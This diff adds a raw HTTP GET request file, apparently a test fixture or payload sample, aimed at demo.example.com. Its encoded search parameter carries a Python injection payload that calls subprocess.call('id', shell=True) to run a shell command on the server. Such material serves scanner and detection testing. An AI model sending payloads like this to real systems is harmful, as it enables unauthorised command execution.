@@ -1,0 +1,4 @@
+GET /a?search=y%3Dsubprocess.call(%26%23x27;id%26%23x27;,shell%3DTrue) HTTP/1.1
+Host: demo.example.com
+Connection: close
+
